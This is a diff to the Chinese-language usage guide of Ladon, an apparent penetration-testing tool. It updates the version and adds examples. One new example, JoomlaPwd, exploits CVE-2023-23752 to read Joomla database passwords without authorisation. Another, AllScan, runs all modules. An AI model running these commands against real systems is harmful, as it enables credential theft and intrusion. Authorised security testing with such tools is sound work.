@@ -5,8 +5,8 @@ Windows版本: .Net、Cobalt Strike、PowerShell
 PS: Study方便本地测试使用，完整功能请使用CMD
 
 ### 版本
-Ladon 10.8 20230218
-简明用法例子 198例
+Ladon 10.9 20230304
+简明用法例子 200例
 
 ### 001 自定义线程扫描
 例子：扫描目标10.1.2段是否存在MS17010漏洞
@@ -841,5 +841,16 @@ Ladon http://192.168.1.8 PocScan
 Ladon 192.168.1.8/24 ExpScan
 Ladon 192.168.1.8 ExpScan
 Ladon http://192.168.1.8 ExpScan
+
+##### 199 JoomlaPwd CVE-2023-23752 未授权网站数据库密码读取
+Ladon 192.168.1.8/24 JoomlaPwd
+Ladon 192.168.1.8 JoomlaPwd
+Ladon http://192.168.1.8 JoomlaPwd
+Ladon url.txt JoomlaPwd
+
+##### 200 AllScan 所有模块
+Ladon 192.168.1.8/24 AllScan
+Ladon 192.168.1.8 AllScan
+Ladon http://192.168.1.8 AllScan
 
 =======================================================
